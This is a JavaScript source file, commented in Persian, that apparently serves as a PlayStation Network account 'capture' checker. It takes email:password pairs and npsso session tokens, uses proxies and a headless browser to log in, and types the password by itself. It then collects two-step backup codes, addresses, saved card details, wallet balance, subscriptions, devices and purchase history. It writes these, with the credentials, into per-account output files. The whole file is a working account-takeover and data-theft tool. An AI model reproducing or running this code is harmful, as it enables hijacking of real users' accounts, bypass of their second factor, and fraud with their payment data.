// psn-api.js (با زمان‌های انتظار بهینه شده)

const puppeteer = require("puppeteer");
const fs = require("fs").promises;
const axios = require("axios");
const { spawn } = require("child_process");
const path = require("path");

let countries;

(async () => {
    countries = await fs.readFile('./data/countries.json', 'utf8');
    countries = JSON.parse(countries)
})()

// Target URLs to monitor (بدون تغییر)
const TARGET_URLS = [
    "https://web.np.playstation.com/api/graphql/v1/op?operationName=getProfileOracle",
    "https://web.np.playstation.com/api/graphql/v1/op?operationName=getPurchasedGameList",
    "https://web.np.playstation.com/api/graphql/v1/op?operationName=queryOracleUserProfileFullSubscription",
    "https://web.np.playstation.com/api/graphql/v1/op?operationName=getUserDevices",
    "https://accounts.api.playstation.com/api/v1/accounts/me/communication",
    /\/twostepbackupcodes$/,
    "https://accounts.api.playstation.com/api/v1/accounts/me/addresses",
    "https://web.np.playstation.com/api/graphql/v2/transact/wallets/savedInstruments",
    'https://web.np.playstation.com/api/graphql/v1//op?operationName=getUserSubscriptions'
];

// Page configurations - کاهش زمان‌های انتظار
const PAGE_CONFIGS = {
    FIRST: {
        url: "https://id.sonyentertainmentnetwork.com/id/management/#/p?entry=p",
        name: "page1",
        waitTime: 8000, // کاهش از 15000 به 8000
    },
    SECOND: {
        url: "https://library.playstation.com/recently-purchased",
        name: "page2",
        waitTime: 5000, // کاهش از 10000 به 5000
    },
    API_URL:
        "https://web.np.playstation.com/api/graphql/v2/transact/wallets/paymentMethods?tenant=PSN",
};

// توابع کمکی بدون تغییر
function createNpssoCookie(npssoValue) {
    return {
        name: "npsso",
        value: npssoValue,
        domain: ".sonyentertainmentnetwork.com",
        path: "/",
        httpOnly: false,
        secure: true,
        sameSite: "None",
    };
}

function formatCookiesForHeader(cookies) {
    return cookies.map((cookie) => `${cookie.name}=${cookie.value}`).join("; ");
}

async function ensureDirectoryExists(dirPath) {
    try {
        await fs.mkdir(dirPath, { recursive: true });
    } catch (error) {
        if (error.code !== "EEXIST") {
            throw error;
        }
    }
}

function isRelevantRequest(url) {
    const staticResourceExtensions = [".ico", ".png", ".jpg", ".css", ".js"];
    return (
        (url.startsWith("http://") || url.startsWith("https://")) &&
        !staticResourceExtensions.some((ext) => url.includes(ext))
    );
}

function isRelevantResponse(url) {
    const ignoredResources = [
        ".ico",
        ".png",
        ".jpg",
        ".css",
        ".js",
        ".woff",
        ".woff2",
    ];
    return !ignoredResources.some((resource) => url.includes(resource));
}

async function extractResponseData(response, headers) {
    const contentType = headers["content-type"] || "";
    const textBasedTypes = ["json", "text", "html", "xml"];

    if (textBasedTypes.some((type) => contentType.includes(type))) {
        try {
            const text = await response.text();

            // Parse JSON if content type indicates JSON
            if (contentType.includes("json")) {
                try {
                    return JSON.parse(text);
                } catch (e) {
                    return text; // Return as text if JSON parsing fails
                }
            }
            return text;
        } catch (e) {
            return `Error getting response data: ${e.message}`;
        }
    } else {
        return `[Binary data with content-type: ${contentType}]`;
    }
}

function extractOperationName(url) {
    const urlObj = new URL(url);

    if (urlObj.searchParams.has("operationName")) {
        return urlObj.searchParams.get("operationName");
    } else {
        // Use the last part of the path if no operationName
        const pathParts = urlObj.pathname.split("/");
        return pathParts[pathParts.length - 1];
    }
}

// Setup request and response tracking (بدون تغییر اساسی)
async function setupRequestAndResponseTracking(
    page,
    npssoValue,
    targetUrls,
    finalResponses,
    onProgress,
    onData
) {
    await page.setRequestInterception(true);
    const requestMap = new Map();

    page.on("request", (request) => {
        const url = request.url();
        const headers = request.headers();
        const method = request.method();
        const resourceType = request.resourceType();
        const postData = request.postData();
        let modified = false;

        requestMap.set(request._requestId, {
            url,
            method,
            headers,
            resourceType,
            postData,
            timestamp: new Date().toISOString(),
        });

        if (isRelevantRequest(url)) {
            if (headers.cookie) {
                if (!headers.cookie.includes("npsso=")) {
                    headers.cookie = `${headers.cookie}; npsso=${npssoValue}`;
                    modified = true;
                }
            } else {
                headers.cookie = `npsso=${npssoValue}`;
                modified = true;
            }
        }

        if (modified) {
            request.continue({ headers });
            onProgress(`Modified request to: ${url}`);
        } else {
            request.continue();
        }
    });

    page.on("response", async (response) => {
        try {
            const request = response.request();
            const url = response.url();
            const requestId = request._requestId;
            const requestInfo = requestMap.get(requestId);

            if (requestInfo && isRelevantResponse(url)) {
                const responseHeaders = response.headers();
                let responseData = await extractResponseData(response, responseHeaders);

                if (url === 'https://auth.api.sonyentertainmentnetwork.com/2.0/ssocookie') {
                    if (responseData.npsso && responseData.expires_in) {
                        onProgress(`New NPSSO token detected: ${responseData.npsso.substring(0, 5)}...`);
                        npssoValue = responseData.npsso; // Update the local npssoValue
                        finalResponses.newNpsso = responseData.npsso;
                    }
                }

                // بررسی اینکه url با یکی از targetUrl ها مچ بشه
                for (const targetUrl of targetUrls) {
                    if (isMatchingTargetUrl(url, targetUrl)) {
                        onProgress(`Found target request: ${url}`);

                        const operationName = extractOperationName(url);

                        processTargetResponse(operationName, responseData, finalResponses);
                        onData(finalResponses);
                        break;
                    }
                }
            }
        } catch (error) {
            console.error(`Error processing response: ${error.message}`);
        } finally {
            requestMap.delete(response.request()._requestId);
        }
    });
}

function isMatchingTargetUrl(url, targetUrl) {
    if (targetUrl instanceof RegExp) {
        return targetUrl.test(url);
    }
    return url === targetUrl || url.startsWith(targetUrl);
}

// Process target response (بدون تغییر)
function processTargetResponse(operationName, responseData, finalResponses) {
    switch (operationName) {
        case "communication":
            if (responseData.realName) {
                finalResponses.profile = {
                    ...(finalResponses.profile || {}),
                    firstName: responseData.realName.name.first,
                    lastName: responseData.realName.name.last,
                };
            }
            break;

        case "getProfileOracle":
            if (responseData.data?.oracleUserProfileRetrieve) {
                const profile = responseData.data.oracleUserProfileRetrieve;
                finalResponses.profile = {
                    ...(finalResponses.profile || {}),
                    name: profile.name,
                    accountId: profile.accountId,
                    age: profile.age,
                    isOfficiallyVerified: profile.isOfficiallyVerified,
                    isPsPlusMember: profile.isPsPlusMember,
                    locale: profile.locale,
                    onlineId: profile.onlineId,
                };
            }
            break;

        case "getPurchasedGameList":
            if (responseData.data?.purchasedTitlesRetrieve) {
                finalResponses.games =
                    responseData.data.purchasedTitlesRetrieve.games.map((item) => ({
                        name: item.name,
                        platform: item.platform,
                        membership: item.membership,
                        isDownloadable: item.isDownloadable,
                    }));
            }
            break;

        case "getUserDevices":
            if (responseData.data?.deviceStorageDetailsRetrieve) {
                finalResponses.devices =
                    responseData.data.deviceStorageDetailsRetrieve.map((item) => ({
                        name: item.deviceName,
                        platform: item.devicePlatform,
                    }));
            }
            break;

        case "twostepbackupcodes":
            if (responseData.backup_codes) {
                finalResponses.backupCodes = responseData.backup_codes.map(
                    (item) => item.code
                );
            }
            break;

        case "addresses":
            if (responseData.length > 0) {
                const mainAddress = responseData?.find((item) => item.isMain);
                finalResponses.address = { ...mainAddress };
            }
    }
}

// Create configured page (بدون تغییر اساسی)
async function createConfiguredPage(
    browser,
    cookies,
    npssoValue,
    targetUrls,
    finalResponses,
    pageName,
    onProgress,
    onData,
    proxyConfig = null
) {
    const page = await browser.newPage();

    // Set proxy authentication if provided
    if (proxyConfig) {
        await page.authenticate({
            username: proxyConfig.username,
            password: proxyConfig.password,
        });
    }

    // Set cookies if provided
    if (cookies && cookies.length > 0) {
        onProgress(`Transferring ${cookies.length} cookies to ${pageName}...`);
        await Promise.all(cookies.map((cookie) => page.setCookie(cookie)));
    } else if (npssoValue) {
        // Set just the NPSSO cookie if no cookies provided
        await page.setCookie(createNpssoCookie(npssoValue));
    }

    // Setup request tracking
    await setupRequestAndResponseTracking(
        page,
        npssoValue,
        targetUrls,
        finalResponses,
        onProgress,
        onData
    );

    // Set viewport
    await page.setViewport({ width: 1920, height: 1080 });

    return page;
}

// Navigate to page - کاهش timeout
async function navigateToPage(page, url, description, onProgress) {
    onProgress(`Opening ${description} (${url})...`);
    await page.goto(url, {
        waitUntil: "networkidle2",
        timeout: 30000, // کاهش از 60000 به 30000
    });
    onProgress(`${description} loaded successfully.`);
}

// Combine unique cookies (بدون تغییر)
function combineUniqueCookies(...cookieArrays) {
    const cookieMap = new Map();

    for (const cookieArray of cookieArrays) {
        if (!cookieArray) continue;

        for (const cookie of cookieArray) {
            const key = `${cookie.name}:${cookie.domain}`;
            cookieMap.set(key, cookie);
        }
    }

    return Array.from(cookieMap.values());
}

// Wait function - کاهش زمان‌های انتظار
async function wait(ms, reason, onProgress) {
    onProgress(`Waiting ${ms}ms ${reason ? "(" + reason + ")" : ""}...`);
    return new Promise((resolve) => setTimeout(resolve, ms));
}

// Main function
async function runPsnApiTool(options) {
    let {
        credentials,
        npsso,
        proxyFile,
        proxyData,
        onProgress = () => { },
        onData = () => { },
        onComplete = () => { },
        onError = () => { },
    } = options;

    let finalResponses = {};

    let proxyConfig = null;
    if (proxyData) {
        proxyConfig = await findWorkingProxy(proxyData, proxyFile, onProgress);
        if (proxyConfig) {
            onProgress(
                `پروکسی سالم انتخاب شده: ${proxyConfig.host}:${proxyConfig.port} (${proxyConfig.protocol})`
            );
        } else {
            onProgress("هیچ پروکسی سالمی یافت نشد؛ ادامه بدون پروکسی");
        }
    }

    const browserOptions = {
        headless: 'new',
        defaultViewport: { width: 1920, height: 1080 },
        args: [
            "--no-sandbox",
            "--disable-setuid-sandbox",
            "--window-size=1920,1080",
            "--disable-web-security",
            "--disable-features=IsolateOrigins,site-per-process",
            "--disable-site-isolation-trials",
            "--disable-dev-shm-usage",
            "--disable-accelerated-2d-canvas",
            "--disable-gpu",
        ],
    };

    if (proxyConfig) {
        browserOptions.args.push(
            `--proxy-server=${proxyConfig.host}:${proxyConfig.port}`
        );
    }

    let browser;
    try {
        onProgress("راه‌اندازی مرورگر...");
        browser = await puppeteer.launch(browserOptions);

        // Setup first page
        let page1 = await createConfiguredPage(
            browser,
            null,
            npsso, 
            TARGET_URLS,
            finalResponses,
            PAGE_CONFIGS.FIRST.name,
            onProgress,
            onData,
            proxyConfig
        );

        // Navigate to first page
        await navigateToPage(page1, PAGE_CONFIGS.FIRST.url, "صفحه اول", onProgress);

        // Wait for first page to fully load and cookies to be set - کاهش زمان انتظار
        await wait(6000, "تا بارگذاری صفحه اول کامل شود", onProgress); // کاهش از 10000 به 6000

        // بررسی وجود المان خطا که نشان می‌دهد اکانت قابل کپچر نیست
        try {
            const errorElementXPath = "/html/body/div[3]/div/div[2]/div/div/div/div/div[4]/div/div[1]";
            onProgress(`در حال بررسی وجود المان خطا با XPath: ${errorElementXPath}`);

            // انتظار برای ظاهر شدن المان با timeout کوتاه (اگر وجود داشته باشد)
            const errorElement = await page1
                .waitForXPath(errorElementXPath, {
                    visible: true,
                    timeout: 3000, // کاهش از 5000 به 3000
                })
                .catch(() => null);

            if (errorElement) {
                const errorText = await page1.evaluate(el => el.textContent, errorElement);
                onProgress(`خطا: اکانت قابل کپچر نیست. ${errorText ? `پیام خطا: ${errorText}` : ''}`);
                onProgress("این اکانت نیاز به NPSSO جدید دارد.");
                
                finalResponses.captureError = true;
                finalResponses.captureErrorMessage = "این اکانت قابل کپچر نیست و نیاز به NPSSO جدید دارد.";
                
                onError(new Error("این اکانت قابل کپچر نیست و نیاز به NPSSO جدید دارد."));
                return;
            } else {
                onProgress("المان خطا یافت نشد، ادامه پردازش...");
            }
        } catch (error) {
            onProgress(`خطا در بررسی المان خطا: ${error.message}`);
        }

        // بررسی وجود المان مورد نظر و کلیک روی آن
        try {
            const targetXPath =
                "/html/body/div[3]/div/div[2]/div/div/div/main/div/div[2]/div/div/div/div[3]/div";
            onProgress(`در حال بررسی وجود المان با XPath: ${targetXPath}`);

            // کاهش timeout
            const targetElement = await page1
                .waitForXPath(targetXPath, {
                    visible: true,
                    timeout: 5000, // کاهش از 8000 به 5000
                })
                .catch(() => null);

            if (targetElement) {
                onProgress("المان مورد نظر یافت شد؛ در حال کلیک...");
                await targetElement.click();
                onProgress("کلیک روی المان انجام شد.");

                // کاهش زمان انتظار
                onProgress("در انتظار بارگذاری صفحه پس از کلیک...");
                await Promise.race([
                    page1.waitForNavigation({
                        waitUntil: "networkidle2",
                        timeout: 8000, // کاهش از 10000 به 8000
                    }),
                    wait(4000, "برای اطمینان از بارگذاری صفحه", onProgress), // کاهش از 6000 به 4000
                ]).catch(() => {
                    onProgress(
                        "انتظار برای ناوبری به پایان رسید (ممکن است صفحه تغییر نکرده باشد)"
                    );
                });

                onProgress("ادامه پردازش پس از کلیک روی المان");
            } else {
                onProgress("المان مورد نظر در صفحه یافت نشد؛ ادامه روند...");
            }
        } catch (error) {
            onProgress(`خطا در بررسی یا کلیک روی المان: ${error.message}`);
        }

        // بررسی وجود فیلد ورود پسورد و پر کردن آن
        try {
            const passwordInputXPath =
                "/html/body/div[3]/div/div[2]/div/div/div/div[3]/div/div/div/div/div/div[2]/div/div/main/div/div[2]/div/form/div[1]/div[2]/div/div/input";
            const submitButtonXPath =
                "/html/body/div[3]/div/div[2]/div/div/div/div[3]/div/div/div/div/div/div[2]/div/div/main/div/div[2]/div/form/div[3]/div/button";

            onProgress("در حال بررسی وجود فیلد ورود پسورد...");

            // کاهش timeout
            const passwordInput = await page1
                .waitForXPath(passwordInputXPath, {
                    visible: true,
                    timeout: 3000, // کاهش از 5000 به 3000
                })
                .catch(() => null);

            if (passwordInput) {
                onProgress("فیلد ورود پسورد یافت شد؛ در حال پر کردن...");

                const password = credentials.includes(":")
                    ? credentials.split(":")[1]
                    : "";

                if (password) {
                    await passwordInput.click({ clickCount: 3 });
                    await passwordInput.press("Backspace");

                    // کاهش تاخیر تایپ
                    await passwordInput.type(password, { delay: 30 }); // کاهش از 50 به 30
                    onProgress("پسورد با موفقیت وارد شد.");

                    // کاهش timeout
                    const submitButton = await page1
                        .waitForXPath(submitButtonXPath, {
                            visible: true,
                            timeout: 3000, // کاهش از 5000 به 3000
                        })
                        .catch(() => null);

                    if (submitButton) {
                        onProgress("دکمه ثبت یافت شد؛ در حال کلیک...");
                        await submitButton.click();
                        onProgress("کلیک روی دکمه ثبت انجام شد.");

                        // کاهش زمان انتظار
                        onProgress("در انتظار بارگذاری صفحه پس از ثبت پسورد...");
                        await Promise.race([
                            page1.waitForNavigation({
                                waitUntil: "networkidle2",
                                timeout: 8000, // کاهش از 10000 به 8000
                            }),
                            wait(7000, "برای اطمینان از بارگذاری صفحه", onProgress), // کاهش از 10000 به 7000
                        ]).catch(() => {
                            onProgress(
                                "انتظار برای ناوبری به پایان رسید (ممکن است صفحه تغییر نکرده باشد)"
                            );
                        });

                        if (finalResponses.newNpsso) {
                            onProgress(`استفاده از NPSSO جدید: ${finalResponses.newNpsso.substring(0, 5)}...`);

                            npsso = finalResponses.newNpsso;

                            await page1.close();

                            page1 = await createConfiguredPage(
                                browser,
                                null,
                                npsso,
                                TARGET_URLS,
                                finalResponses,
                                PAGE_CONFIGS.FIRST.name,
                                onProgress,
                                onData,
                                proxyConfig
                            );

                            await navigateToPage(page1, PAGE_CONFIGS.FIRST.url, "صفحه اول (با NPSSO جدید)", onProgress);

                            // کاهش زمان انتظار
                            await wait(6000, "برای اطمینان از بارگذاری صفحه با NPSSO جدید", onProgress); // کاهش از 10000 به 6000
                        } else {
                            onProgress("NPSSO جدید دریافت نشد، ادامه با NPSSO فعلی...");
                        }

                    } else {
                        onProgress("دکمه ثبت یافت نشد.");
                    }
                } else {
                    onProgress("پسورد در credentials یافت نشد یا فرمت نادرست است.");
                }
            } else {
                onProgress("فیلد ورود پسورد در صفحه یافت نشد؛ ادامه روند...");
            }
        } catch (error) {
            onProgress(`خطا در پر کردن فیلد پسورد: ${error.message}`);
        }

        const cookies = await page1.cookies();
        onProgress(`دریافت ${cookies.length} کوکی از صفحه اول`);

        const hasNpsso = cookies.some((cookie) => cookie.name === "npsso");
        if (!hasNpsso) {
            onProgress("کوکی npsso یافت نشد؛ اضافه کردن دستی");
            cookies.push(createNpssoCookie(npsso));
        }

        try {
            onProgress("در حال تلاش برای کلیک روی عنصر مشخص...");
            // کاهش timeout
            await page1.waitForXPath(
                "/html/body/div[3]/div/div[2]/div/div/div/div[2]/div/div[2]/div/div/ul/li[1]/ul/li[2]/div",
                { timeout: 15000 } // کاهش از 20000 به 15000
            );
            const [element] = await page1.$x(
                "/html/body/div[3]/div/div[2]/div/div/div/div[2]/div/div[2]/div/div/ul/li[1]/ul/li[2]/div"
            );

            if (element) {
                onProgress("عنصر یافت شد؛ کلیک...");
                await element.click();
                onProgress("کلیک موفقیت‌آمیز.");

                // کاهش زمان انتظار
                await wait(2000, "پس از کلیک", onProgress); // کاهش از 3000 به 2000

                onProgress("در انتظار ناوبری پس از کلیک اول...");
                try {
                    await page1
                        .waitForNavigation({
                            waitUntil: "networkidle2",
                            timeout: 8000, // کاهش از 10000 به 8000
                        })
                        .catch(() => {
                            onProgress("ناوبری رخ نداد یا قبلاً انجام شده است.");
                        });
                    // کاهش زمان انتظار
                    await wait(2000, "تا پایداری صفحه جدید", onProgress); // کاهش از 3000 به 2000
                    onProgress(
                        'در حال تلاش برای یافتن و کلیک روی عنصري با XPath مشخص: //*[@id="ember138"]/div/div/div/div[1]/div'
                    );
                    await page1
                        .waitForXPath('//*[@id="ember138"]/div/div/div/div[1]/div', {
                            timeout: 3000, // کاهش از 5000 به 3000
                        })
                        .catch((e) => {
                            onProgress(
                                `عنصر با XPath مشخص در زمان تعیین شده یافت نشد: ${e.message}`
                            );
                        });
                    const [secondElement] = await page1.$x(
                        "/html/body/div[3]/div/div[2]/div/div/div/div[2]/div/div[3]/div/div/div/div/div/main/div/div/div[2]/div[1]/ul[3]/li[3]/button/div/div/div/div[1]/div"
                    );
                    if (secondElement) {
                        onProgress("عنصر دوم پیدا شد؛ کلیک...");
                        await secondElement.click();
                        onProgress("کلیک عنصر دوم موفقیت‌آمیز.");
                        // کاهش زمان انتظار
                        await wait(2000, "پس از کلیک عنصر دوم", onProgress); // کاهش از 3000 به 2000
                    } else {
                        onProgress("عنصر دوم پیدا نشد؛ ادامه روند...");
                    }
                } catch (error) {
                    onProgress(`خطا در کلیک دوم: ${error.message}`);
                }
            } else {
                onProgress("عنصر با XPath مشخص یافت نشد.");
            }
        } catch (error) {
            onProgress(`خطا هنگام تلاش برای کلیک روی عنصر: ${error.message}`);
        }

        // Setup second page
        const page2 = await createConfiguredPage(
            browser,
            cookies,
            npsso,
            TARGET_URLS,
            finalResponses,
            PAGE_CONFIGS.SECOND.name,
            onProgress,
            onData,
            proxyConfig
        );

        // Navigate to second page
        await navigateToPage(
            page2,
            PAGE_CONFIGS.SECOND.url,
            "صفحه دوم",
            onProgress
        );

        // کاهش زمان انتظار
        await wait(2000, "پیش از بارگذاری مجدد صفحه دوم", onProgress); // کاهش از 3000 به 2000

        await navigateToPage(
            page2,
            PAGE_CONFIGS.SECOND.url,
            "صفحه دوم (Reload 1)",
            onProgress
        );

        if (finalResponses.profile?.isPsPlusMember) {
            // کاهش timeout
            await page1.waitForXPath(
                "/html/body/div[3]/div/div[2]/div/div/div/div[2]/div/div[2]/div/div/ul/li[2]/ul/li[7]/div/button/div",
                { timeout: 15000 } // کاهش از 20000 به 15000
            );
            const [button1] = await page1.$x(
                "/html/body/div[3]/div/div[2]/div/div/div/div[2]/div/div[2]/div/div/ul/li[2]/ul/li[7]/div/button/div"
            );

            if (!button1) {
                onProgress(`دکمه با XPath  پیدا نشد.`);
                return false;
            }

            onProgress("عنصر یافت شد؛ کلیک...");
            await button1.click();
            onProgress("کلیک موفقیت‌آمیز.");

            // کاهش timeout
            await page1.waitForXPath(
                "/html/body/div[3]/div/div[2]/div/div/div/div[3]/div/div/div[3]/div[3]/main/div/div[4]/div[3]",
                { timeout: 15000 } // کاهش از 20000 به 15000
            );
            const [button2] = await page1.$x(
                "/html/body/div[3]/div/div[2]/div/div/div/div[3]/div/div/div[3]/div[3]/main/div/div[4]/div[3]"
            );

            if (!button2) {
                onProgress(`دکمه با XPath  پیدا نشد.`);
                return false;
            }

            onProgress("عنصر یافت شد؛ کلیک...");
            await button2.click();
            onProgress("کلیک موفقیت‌آمیز.");

            onProgress(`دکمه پیدا شد، در حال کلیک...`);

            // کاهش زمان انتظار
            await wait(3000, " پردازش", onProgress); // کاهش از 5000 به 3000
        }

        onProgress("دریافت کوکی‌های نهایی از تمامی صفحات...");
        const finalPage1Cookies = await page1.cookies();
        const finalPage2Cookies = await page2.cookies();

        onProgress(
            `تعداد کوکی دریافت شده: صفحه1=${finalPage1Cookies.length}, صفحه2=${finalPage2Cookies.length}`
        );

        const allCookies = combineUniqueCookies(
            finalPage1Cookies,
            finalPage2Cookies
        );
        onProgress(`تعداد کوکی‌های ترکیبی: ${allCookies.length}`);

        // API calls remain unchanged as they are network requests
        const creditCards = await axios.get(
            "https://web.np.playstation.com/api/graphql/v2/transact/wallets/savedInstruments?tenant=PSN",
            {
                headers: {
                    Cookie: allCookies
                        .map((cookie) => `${cookie.name}=${cookie.value}`)
                        .join("; "),
                },
            }
        );

        finalResponses = {
            ...finalResponses,
            creditCards: generatePaymentMethodsText(creditCards.data),
        };

        const wallets = await axios.get(
            "https://web.np.playstation.com/api/graphql/v2/transact/wallets?tenant=PSN",
            {
                headers: {
                    Cookie: allCookies
                        .map((cookie) => `${cookie.name}=${cookie.value}`)
                        .join("; "),
                },
            }
        );

        finalResponses = { ...finalResponses, wallets: wallets.data };

        const subscriptions = await axios.get(
            "https://web.np.playstation.com/api/graphql/v1//op?operationName=getUserSubscriptions&variables=%7B%7D&extensions=%7B%22persistedQuery%22%3A%7B%22version%22%3A1%2C%22sha256Hash%22%3A%22417949a4ca96109f5e8c56b8e3c51db8a86ba9410966ad9d2300f6af3b51e748%22%7D%7D",
            {
                headers: {
                    Cookie: allCookies
                        .map((cookie) => `${cookie.name}=${cookie.value}`)
                        .join("; "),
                    'content-type': 'application/json'
                },
            }
        );

        finalResponses = {
            ...finalResponses,
            plusTitle: finalResponses.profile?.isPsPlusMember && subscriptions.data.data.fetchSubscriptions.subscriptions[0].productName,
            plusExpireDate: finalResponses.profile?.isPsPlusMember && formattedExpiredDate(subscriptions.data.data.fetchSubscriptions.subscriptions[0].renewalDate)
        }

        const transactions = await axios.get(
            "https://web.np.playstation.com/api/graphql/v1/transact/transaction/history",
            {
                params: {
                    limit: 500,
                    startDate: "2010-01-01T00:00:00.000-0400",
                    endDate: "2025-04-06T23:59:59.999-0400",
                    includePurged: false,
                    transactionTypes: [
                        "CREDIT",
                        "CYCLE_SUBSCRIPTION",
                        "DEBIT",
                        "DEPOSIT_CHARGE",
                        "DEPOSIT_VOUCHER",
                        "PRODUCT_PURCHASE",
                        "REFUND_PAYMENT_CHARGE",
                        "REFUND_PAYMENT_WALLET",
                        "VOUCHER_PURCHASE",
                        "WALLET_BALANCE_CONVERSION",
                    ].join(","),
                },
                headers: {
                    Cookie: allCookies
                        .map((cookie) => `${cookie.name}=${cookie.value}`)
                        .join("; "),
                },
            }
        );

        finalResponses = {
            ...finalResponses,
            transactionNumbers: transactions.data.transactions.length,
            trans: transactions.data.transactions
                .filter(
                    (t) =>
                        (t.additionalInfo?.orderItems?.[0]?.totalPrice &&
                            Math.abs(t.additionalInfo.orderItems[0].totalPrice.value) > 0) || (t.additionalInfo?.voucherPayments?.length > 0 && t.additionalInfo?.voucherPayments[0].voucherCode) && t.invoiceType !== 'WALLET_FUNDING'
                )
                .map((t) => {
                    const fullSkuId = t.additionalInfo.orderItems[0].skuId;
                    const match = fullSkuId.match(/([A-Z0-9]+-[A-Z0-9]+_[0-9]+)/);
                    const formattedSkuId = match ? match[0] : fullSkuId;

                    return `${t.additionalInfo.orderItems[0].productName} [${t.additionalInfo?.voucherPayments?.length > 0 && t.additionalInfo?.voucherPayments[0].voucherCode ? "Gift Card" : t.additionalInfo.orderItems[0].totalPrice.formattedValue
                        }] | [ ${formattedSkuId} ] | [ ${new Date(t.transactionDetail.transactionDate).getMonth() + 1
                        }/${new Date(
                            t.transactionDetail.transactionDate
                        ).getDate()}/${new Date(
                            t.transactionDetail.transactionDate
                        ).getFullYear()} ]`;
                })
                .join("\n"),
        };

        // استفاده از npsso به جای finalResponses.newNpsso || npsso
        const pythonProcess = spawn("python3", ["get_devices.py", npsso]);

        let result = "";
        let error = "";

        pythonProcess.stdout.on("data", (data) => {
            result += data.toString();
        });

        pythonProcess.stderr.on("data", (data) => {
            error += data.toString();
        });

        pythonProcess.on("close", async (code) => {
            if (code !== 0) {
                console.error("خطا در اجرای پایتون:", error);
                onError(new Error(`خطا در اجرای پایتون: ${error}`));
                return;
            }

            try {
                finalResponses = {
                    ...finalResponses,
                    newDevices: JSON.parse(result),
                };

                const hasSixMonthsPassed =
                    finalResponses.newDevices.length > 0
                        ? new Date(
                            finalResponses.newDevices.reduce((latest, current) =>
                                new Date(current.activationDate) >
                                    new Date(latest.activationDate)
                                    ? current
                                    : latest
                            ).activationDate
                        ) < new Date(new Date().setMonth(new Date().getMonth() - 6))
                        : false;

                const countryCode = finalResponses.address?.country || null

                // ساخت خروجی نهایی به صورت متن
                const output = `
----------------------- « Account Info » -----------------------
- Account : ${credentials}
- Npsso : ${npsso}
- Backup Codes :  [ ${finalResponses.backupCodes
                        ? finalResponses.backupCodes.join(" - ")
                        : "N/A"
                    } ]
--------------------------- « Details » --------------------------
- Country | City | Postal Code : ${countryCode ? (countries.find((item) => item.code === countryCode)).name : "N/A"
                    } - ${finalResponses.address?.city || "N/A"} - ${finalResponses.address?.postalCode || "N/A"
                    }
- Balance : ${finalResponses.wallets?.debtBalance}.${finalResponses.wallets?.currentAmount
                    } ${finalResponses.wallets?.currencyCode || ""}
- PSN ID : ${finalResponses.profile?.onlineId || "N/A"}
- Payments : ${finalResponses.creditCards || "Not Found"} 
- PS Plus : ${finalResponses.profile?.isPsPlusMember ? `Yes! - ${finalResponses.plusTitle} | ${finalResponses.plusExpireDate}` : "No!"
                    }
- Devices : [ ${finalResponses.newDevices
                        ? [
                            ...new Set(finalResponses.newDevices.map((d) => d.deviceType)),
                        ].join(" - ")
                        : "N/A"
                    } ]
- Deactive : ${hasSixMonthsPassed === false ? "No!" : "Yes!"}
- Transaction Numbers : ${finalResponses.transactionNumbers || "N/A"}
--------------------------- « Games » ---------------------------
${finalResponses.trans || "No games found"}
--------------------------- « Finish » ----------------------------
`;

                // ذخیره خروجی در فایل
                try {
                    const email = credentials.split(":")[0];
                    const date = new Date().toISOString().split("T")[0];
                    const fileName = `${email}-${date}.txt`;
                    const outputDir = path.join(__dirname, "output");
                    await ensureDirectoryExists(outputDir);
                    const filePath = path.join(outputDir, fileName);
                    await fs.writeFile(filePath, output, "utf8");

                    onProgress(`خروجی در فایل ${fileName} ذخیره شد.`);
                    finalResponses.outputFilePath = filePath;
                    finalResponses.formattedOutput = output;
                } catch (fileError) {
                    onProgress(`خطا در ذخیره فایل خروجی: ${fileError.message}`);
                }

                onProgress("پردازش با موفقیت به اتمام رسید");
                onComplete({
                    ...finalResponses,
                    formattedOutput: output,
                });
            } catch (e) {
                console.error("خطا در تبدیل خروجی:", e);
                console.log("خروجی خام:", result);
                onError(e);
            }
        });
    } catch (error) {
        onProgress(`خطا رخ داده: ${error.message}`);
        onError(error);
    } finally {
        if (browser) {
            await browser.close();
            onProgress("مرورگر بسته شد.");
        }
    }
}

function generatePaymentMethodsText(response) {
    let paymentMethodsText = [];

    if (response.creditCards) {
        response.creditCards.forEach((card) => {
            if (card.common.isPaymentMethodAvailable && !card.common.banned) {
                let cardInfo = `[${card.common.paymentMethodId} - ${card.expirationYear}/${card.expirationMonth}]`;
                paymentMethodsText.push(cardInfo);
            }
        });
    }

    if (
        response.payPal &&
        response.payPal.common.isPaymentMethodAvailable &&
        !response.payPal.common.banned
    ) {
        paymentMethodsText.push(`[PayPal]`);
    }

    return paymentMethodsText.join(" - ");
}

const formattedExpiredDate = (expiredDate) => {
    const d = new Date(new Date(expiredDate).getTime() + 86400000);
    return `${String(d.getUTCDate()).padStart(2, '0')}/${String(d.getUTCMonth() + 1).padStart(2, '0')}/${d.getUTCFullYear()}`
}

module.exports = { runPsnApiTool };
